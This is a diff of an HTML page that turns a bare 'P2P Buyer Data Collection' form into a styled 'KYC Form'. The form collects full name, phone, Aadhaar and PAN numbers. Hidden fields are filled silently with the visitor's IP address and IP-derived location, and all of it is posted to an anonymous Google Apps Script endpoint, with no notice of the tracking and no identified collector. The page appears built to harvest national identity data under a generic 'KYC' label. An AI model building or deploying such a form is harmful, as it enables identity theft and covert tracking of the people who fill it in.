@@ -1,71 +1,99 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>P2P Buyer Form</title>
+  <meta charset="UTF-8">
+  <title>KYC Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      padding: 40px;
+    }
+    form {
+      max-width: 400px;
+      margin: auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    label {
+      display: block;
+      margin-top: 10px;
+    }
+    input[type="text"],
+    input[type="tel"] {
+      width: 100%;
+      padding: 8px;
+      margin-top: 4px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 10px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
 <body>
-  <h2>P2P Buyer Data Collection</h2>
-<form id="buyerForm">
-  <input name="name" required />
-  <input name="phone" required />
-  <input name="aadhaar" required />
-  <input name="pan" required />
-  <!-- We will fetch location + IP automatically -->
-  <button type="submit">Submit</button>
-</form>
+  <h2>KYC Form</h2>
+  <form id="p2p-form">
+    <label for="name">Full Name</label>
+    <input type="text" name="name" required>
 
-  <p id="msg"></p>
+    <label for="phone">Phone Number</label>
+    <input type="tel" name="phone" required pattern="[0-9]{10}">
 
- <script>
-  document.getElementById("buyerForm").addEventListener("submit", async function(e) {
-    e.preventDefault();
+    <label for="aadhaar">Aadhaar Number</label>
+    <input type="text" name="aadhaar" required pattern="[0-9]{12}">
 
-    const form = e.target;
+    <label for="pan">PAN Number</label>
+    <input type="text" name="pan" required pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}">
 
-    const name = form.name.value;
-    const phone = form.phone.value;
-    const aadhaar = form.aadhaar.value;
-    const pan = form.pan.value;
+    <input type="hidden" name="ip">
+    <input type="hidden" name="location">
 
-    // Get IP
-    const ipRes = await fetch("https://api.ipify.org?format=json");
-    const ipData = await ipRes.json();
-    const ip = ipData.ip;
+    <button type="submit">Submit</button>
+  </form>
 
-    // Get location
-    let location = "Unknown";
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          location = `${position.coords.latitude}, ${position.coords.longitude}`;
-          submitToServer();
-        },
-        error => {
-          location = "Location Denied";
-          submitToServer();
+  <script>
+    document.getElementById("p2p-form").addEventListener("submit", async function(e) {
+      e.preventDefault();
+      const form = e.target;
+
+      try {
+        // Get IP and location
+        const ipResp = await fetch("https://ipapi.co/json/");
+        const ipInfo = await ipResp.json();
+        form.ip.value = ipInfo.ip;
+        form.location.value = `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}`;
+
+        // Prepare FormData and send to Google Apps Script
+        const fd = new FormData(form);
+        const res = await fetch("https://script.google.com/macros/s/AKfycbyq7sS4rpRCnbu59SbqCcmcXm58fjQvgbMawBrLrh_LrAq5lLNGvhGNyST423Wz6anv3A/exec", {
+          method: "POST",
+          body: fd,
+        });
+
+        if (res.ok) {
+          alert("✅ Submitted successfully!");
+          form.reset();
+        } else {
+          alert("❌ Submission failed. Please try again.");
         }
-      );
-    } else {
-      submitToServer(); // Location not supported
-    }
-
-    async function submitToServer() {
-      const payload = { name, phone, aadhaar, pan, ip, location };
-
-      const res = await fetch("https://script.google.com/macros/s/AKfycbyq7sS4rpRCnbu59SbqCcmcXm58fjQvgbMawBrLrh_LrAq5lLNGvhGNyST423Wz6anv3A/exec", {
-        method: "POST",
-        body: JSON.stringify(payload),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      });
-
-      const result = await res.text();
-      alert("Data submitted: " + result);
-    }
-  });
-</script>
-
+      } catch (err) {
+        alert("⚠️ Error: " + err.message);
+      }
+    });
+  </script>
 </body>
 </html>
-
